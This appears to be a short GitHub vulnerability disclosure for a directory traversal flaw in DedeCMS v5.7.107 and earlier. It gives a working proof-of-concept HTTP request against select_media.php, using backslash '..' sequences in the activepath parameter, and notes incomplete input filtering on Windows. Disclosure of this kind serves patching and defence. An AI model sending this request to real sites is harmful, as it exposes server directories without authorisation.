# dedecms-Directory-Traversal
DedeCMS v5.7.107 Directory Traversal

dedecms is a website building system. Its v5.7.107 and below have a directory traversal vulnerability. An attacker can traverse server directories

poc:
```
GET /include/dialog/select_media.php?f=&activepath=\uploads\media\..\..\..\..\ HTTP/1.1
Host: 192.168.1.103
Cookie: PHPSESSID=ggcnj9euppapcl74tjh59hqri6;
Connection: close

```
![image](https://user-images.githubusercontent.com/65259880/234688888-62010cbe-3d20-44e4-8d41-fda1cfe9c467.png)

White box audit:
Vulnerability location: include\dialog\select_media.php
Lines 20 and 21 do not completely filter the parameters passed in by the user. If the system is windows, it can be bypassed

![image](https://user-images.githubusercontent.com/65259880/234688993-e8bc060e-44f2-45ed-b2b3-4e948579c759.png)

 
